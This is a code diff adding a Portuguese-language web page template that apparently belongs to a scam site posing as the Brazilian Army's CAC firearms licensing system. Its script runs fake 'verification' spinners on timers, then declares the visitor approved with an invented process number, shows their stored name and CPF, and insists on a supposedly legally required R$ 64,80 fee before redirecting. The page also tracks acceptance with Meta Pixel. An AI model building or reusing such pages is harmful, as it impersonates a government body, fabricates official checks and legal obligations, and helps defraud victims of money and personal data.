@@ -1,0 +1,332 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<style>
+body {
+    background-color: #fff !important;
+}
+.spinner {
+    border: 3px solid #f3f3f3;
+    border-top: 3px solid #2d5a27;
+    border-radius: 50%;
+    width: 24px;
+    height: 24px;
+    animation: spin 1s linear infinite;
+    margin-right: 12px;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.status-item {
+    display: none;
+    align-items: center;
+    padding: 16px;
+    background-color: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 4px;
+    margin-bottom: 12px;
+}
+.status-item.active {
+    display: flex;
+}
+.form-container {
+    display: none;
+    background-color: #f8fafc;
+    padding: 24px;
+    border: 2px solid #2d5a27;
+    border-radius: 4px;
+    margin-bottom: 24px;
+}
+.form-container.show {
+    display: block;
+}
+.toggle-switch {
+    position: relative;
+    width: 60px;
+    height: 30px;
+    background-color: #ccc;
+    border-radius: 30px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+.toggle-switch.active {
+    background-color: #2d5a27;
+}
+.toggle-slider {
+    position: absolute;
+    top: 3px;
+    left: 3px;
+    width: 24px;
+    height: 24px;
+    background-color: white;
+    border-radius: 50%;
+    transition: transform 0.3s;
+}
+.toggle-switch.active .toggle-slider {
+    transform: translateX(30px);
+}
+.btn-disabled {
+    background-color: #9ca3af;
+    cursor: not-allowed;
+}
+.btn-enabled {
+    background-color: #2d5a27;
+    cursor: pointer;
+}
+.btn-enabled:hover {
+    background-color: #22422a;
+}
+</style>
+
+<main class="container mx-auto px-4 py-8" style="background-color: #fff; min-height: 100vh;">
+    <div class="max-w-2xl mx-auto">
+        
+        <!-- Status de Verificação -->
+        <div id="verification-section" class="mb-8">
+            <h2 class="text-2xl font-bold text-center text-green-800 mb-8">Verificando Dados do Candidato</h2>
+            
+            <div class="status-item" id="status-1">
+                <div class="spinner"></div>
+                <span class="text-gray-700 font-medium">Verificando seu histórico criminal...</span>
+            </div>
+            
+            <div class="status-item" id="status-2">
+                <div class="spinner"></div>
+                <span class="text-gray-700 font-medium">Consultando histórico de empregos...</span>
+            </div>
+            
+            <div class="status-item" id="status-3">
+                <div class="spinner"></div>
+                <span class="text-gray-700 font-medium">Analisando seu perfil psicotécnico...</span>
+            </div>
+            
+            <div class="status-item" id="status-4">
+                <div class="spinner"></div>
+                <span class="text-gray-700 font-medium">Consultando bases de dados federais...</span>
+            </div>
+        </div>
+
+        <!-- Formulário de Aprovação -->
+        <div class="form-container" id="approval-form">
+            <div class="text-center mb-6">
+                <div class="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-4">
+                    <i class="fas fa-check-circle text-green-600 text-2xl"></i>
+                </div>
+                <h3 class="text-2xl font-bold text-green-800">PARABÉNS! VOCÊ FOI APROVADO</h3>
+                <p class="text-gray-600 mt-2">Seu pedido de CAC foi aprovado pelo sistema do Exército Brasileiro</p>
+            </div>
+
+            <div class="bg-white p-6 rounded border border-gray-300 mb-6">
+                <h4 class="text-lg font-bold text-gray-800 mb-4">DADOS DO REQUERENTE</h4>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">NOME COMPLETO:</label>
+                        <p class="text-base text-gray-900" id="candidate-name">Carregando...</p>
+                    </div>
+                    
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">CPF:</label>
+                        <p class="text-base text-gray-900" id="candidate-cpf">Carregando...</p>
+                    </div>
+                </div>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">Nº PROCESSO CAC:</label>
+                        <p class="text-base font-bold text-green-700" id="process-number">678923/2025 - 2ª RM</p>
+                    </div>
+                    
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">STATUS:</label>
+                        <p class="text-base font-bold text-green-600">APROVADO</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Próximas Etapas -->
+            <div class="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
+                <h4 class="text-lg font-bold text-blue-800 mb-3">PRÓXIMAS ETAPAS</h4>
+                <div class="space-y-2 text-blue-700">
+                    <p><strong>1. Exame Prático de Tiro:</strong></p>
+                    <p class="text-sm">Você deverá realizar o Exame Prático de Tiro em uma base do Exército Brasileiro. Durante 1 hora, você aprenderá a manusear o armamento liberado e receberá noções básicas de tiro.</p>
+                    
+                    <p class="mt-4"><strong>2. Pagamento Obrigatório:</strong></p>
+                    <p class="text-sm">Para prosseguir com o agendamento do exame prático de tiro, você deve realizar o pagamento da <strong>Taxa Estadual de Emissão do CR</strong>, que é o documento oficial do CAC.</p>
+                </div>
+            </div>
+
+            <!-- Taxa Obrigatória -->
+            <div class="bg-yellow-50 border border-yellow-300 p-4 mb-6 rounded">
+                <div class="flex items-start">
+                    <div class="flex-shrink-0">
+                        <i class="fas fa-exclamation-triangle text-yellow-600 text-xl"></i>
+                    </div>
+                    <div class="ml-3">
+                        <h4 class="text-lg font-bold text-yellow-800">PAGAMENTO DA TAXA ESTADUAL</h4>
+                        <p class="text-yellow-700 mt-2">
+                            O pagamento da Taxa Estadual de Emissão do CR no valor de <strong>R$ 64,80</strong> é obrigatório conforme legislação federal. Esta taxa é necessária para a emissão do seu documento CAC oficial.
+                        </p>
+                        <p class="text-yellow-700 mt-2 text-sm">
+                            <strong>IMPORTANTE:</strong> Esta taxa é exigida por lei e deve ser paga para dar continuidade ao processo de certificação CAC.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Termo de Aceitação -->
+            <div class="bg-gray-50 border border-gray-300 p-4 mb-6 rounded">
+                <div class="flex items-start">
+                    <div class="flex-shrink-0 mt-1">
+                        <div class="toggle-switch" id="terms-toggle" onclick="toggleTerms()">
+                            <div class="toggle-slider"></div>
+                        </div>
+                    </div>
+                    <div class="ml-4">
+                        <p class="text-gray-800 text-sm">
+                            <strong>ACEITO OS TERMOS:</strong> Concordo que a Taxa Estadual de Emissão do CR no valor de R$ 64,80 é obrigatória por determinação legal e autorizo o processamento do pagamento para dar continuidade ao meu processo CAC.
+                        </p>
+                        <p class="text-xs text-gray-600 mt-2">
+                            <i class="fas fa-info-circle mr-1"></i>
+                            Clique no botão acima para aceitar os termos e prosseguir com o cadastro.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Botão Finalizar -->
+            <div class="text-center">
+                <button id="finalize-button" 
+                        class="btn-disabled text-white font-bold py-3 px-8 rounded transition-all duration-300"
+                        onclick="finalizeCadastro()" 
+                        disabled>
+                    <i class="fas fa-check-circle mr-2"></i>
+                    Finalizar Cadastro
+                </button>
+            </div>
+        </div>
+    </div>
+</main>
+
+<script>
+let currentStatus = 0;
+const totalStatus = 4;
+let termsAccepted = false;
+
+// Carregar dados do usuário da sessão/localStorage
+document.addEventListener('DOMContentLoaded', function() {
+    startVerificationProcess();
+});
+
+function startVerificationProcess() {
+    showStatus(1);
+    
+    // Executar cada status por 3 segundos
+    setTimeout(() => showStatus(2), 3000);
+    setTimeout(() => showStatus(3), 6000);
+    setTimeout(() => showStatus(4), 9000);
+    
+    // Mostrar formulário após todos os status
+    setTimeout(() => {
+        hideAllStatus();
+        showApprovalForm();
+        loadCandidateData();
+    }, 12000);
+}
+
+function showStatus(statusNumber) {
+    // Esconder status anteriores
+    hideAllStatus();
+    
+    // Mostrar status atual
+    const statusElement = document.getElementById(`status-${statusNumber}`);
+    if (statusElement) {
+        statusElement.classList.add('active');
+    }
+}
+
+function hideAllStatus() {
+    for (let i = 1; i <= totalStatus; i++) {
+        const statusElement = document.getElementById(`status-${i}`);
+        if (statusElement) {
+            statusElement.classList.remove('active');
+        }
+    }
+}
+
+function showApprovalForm() {
+    document.getElementById('verification-section').style.display = 'none';
+    document.getElementById('approval-form').classList.add('show');
+}
+
+function loadCandidateData() {
+    // Tentar buscar dados do localStorage primeiro
+    const storedName = localStorage.getItem('nome') || localStorage.getItem('full_name');
+    const storedCpf = localStorage.getItem('cpf');
+    
+    if (storedName && storedName.trim() !== '') {
+        document.getElementById('candidate-name').textContent = storedName.toUpperCase();
+    } else {
+        document.getElementById('candidate-name').textContent = 'CANDIDATO CAC';
+    }
+    
+    if (storedCpf && storedCpf.trim() !== '') {
+        document.getElementById('candidate-cpf').textContent = storedCpf;
+    } else {
+        document.getElementById('candidate-cpf').textContent = 'XXX.XXX.XXX-XX';
+    }
+}
+
+function toggleTerms() {
+    const toggle = document.getElementById('terms-toggle');
+    const button = document.getElementById('finalize-button');
+    
+    termsAccepted = !termsAccepted;
+    
+    if (termsAccepted) {
+        toggle.classList.add('active');
+        button.classList.remove('btn-disabled');
+        button.classList.add('btn-enabled');
+        button.disabled = false;
+    } else {
+        toggle.classList.remove('active');
+        button.classList.remove('btn-enabled');
+        button.classList.add('btn-disabled');
+        button.disabled = true;
+    }
+}
+
+function finalizeCadastro() {
+    if (!termsAccepted) {
+        alert('Por favor, aceite os termos para prosseguir.');
+        return;
+    }
+    
+    // Enviar evento para Meta Pixel
+    if (typeof fbq !== 'undefined') {
+        fbq('track', 'Lead', {
+            content_name: 'Termos CAC Aceitos',
+            value: 64.80,
+            currency: 'BRL'
+        });
+        
+        fbq('trackCustom', 'CAC_Terms_Accepted', {
+            step: 'verificacao_completa',
+            value: 64.80,
+            currency: 'BRL'
+        });
+    }
+    
+    // Mostrar loading e redirecionar
+    const button = document.getElementById('finalize-button');
+    button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Finalizando...';
+    button.disabled = true;
+    
+    setTimeout(() => {
+        window.location.href = '/aprovado';
+    }, 2000);
+}
+</script>
+
+{% endblock %}
